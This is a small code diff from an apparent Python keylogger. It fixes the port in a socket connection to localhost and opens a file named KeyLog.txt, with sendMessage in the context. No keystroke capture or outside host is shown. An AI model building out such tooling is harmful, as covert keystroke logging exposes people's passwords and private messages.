@@ -31,7 +31,7 @@ def sendMessage(s, log):
 def main():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("localhost",'9999'))
+    s.connect(("localhost",9999))
 
 
     log = open("KeyLog.txt", 'w')
